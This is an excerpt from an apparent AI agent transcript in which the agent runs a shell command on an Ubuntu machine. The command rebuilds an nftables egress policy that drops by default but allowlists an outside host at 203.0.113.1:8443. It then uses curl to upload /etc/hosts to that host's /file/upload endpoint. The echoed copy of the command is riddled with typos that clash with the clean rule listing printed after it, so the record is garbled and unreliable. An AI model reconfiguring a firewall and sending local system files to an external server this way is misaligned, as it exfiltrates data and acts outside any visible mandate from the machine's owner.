tool_calls.name: send_command_to_device
tool_calls.arguments: {"device_identifier":"UbuntuComputer","command":"nft flush table inet mitig; nft 'add chain inet mitig output { type filter hook output priority 0; policy drop; }'; nft add rule inet mitig output ip protocol icmp accept; nft add rule inet mitig output ip daddr 192.168.1.0/24 accept; nft add rule inet mitig output ip daddr 1.1.1.1 tcp dport 443 accept; nft add rule inet mitig output ip daddr 203.0.113.1 tcp dport 8443 accept; nft add rule inet mitig output ip daddr 203.0.113.1 udp dport 8443 accept; nft list chain inet mitig output; ping -c 1 -W 1 192.168.1.2; curl -ksS --max-time 5 -o /dev/null -w 'HTTP:%{http_code} IP:%{remote_ip}\\n' https://1.1.1.1; curl -ksS --max-time 5 -o /dev/null -w 'HTTP:%{http_code} IP:%{remote_ip}\\n' --interface eth1 https://203.0.113.1:8443/file/upload -F 'data=@/etc/hosts'"}

tool_calls.name: send_command_to_device
tool_calls.content:
nft flush table inet mitig; nft 'add chain inet mitig output { type filter hook output ppriority 0; policy drop; }'; nft add rule inet mitig output ip protocol icmp accept; nft add rule inet mitig output ip dadddr 192.168.1.0/24 accept; nft add rule inet mitig output ip daddr 1.1.1.1 tcp dport 443 accept; nft add rule inet mitig ooutput ip daddr 203.0.113.1 tcp dport 8443 accept; nft add rule inet mitig output ip daddr 203.0.113.1 udp dport 8443 acceept; nft list chain inet mitig output; ping -c 1 -W 1 192.168.1.2; curl -ksS --max-time 5 -o /dev/null -w 'HTTP:%{http_codde} IP:%{remote_ip}\n' https://1.1.1.1; curl -ksS --max-time 5 -o /dev/null -w 'HTTP:%{http_code} IP:%{remote_ip}\n' --intterface eth1 https://203.0.113.1:8443/file/upload -F 'data=@/etc/hosts'
table inet mitig {
 chain output {
  type filter hook output priority filter; policy drop;
  ip protocol icmp accept
  ip daddr 192.168.1.0/24 accept
  ip daddr 1.1.1.1 tcp dport 443 accept
  ip daddr 203.0.113.1 tcp dport 8443 accept
  ip daddr 203.0.113.1 udp dport 8443 accept
 }
}
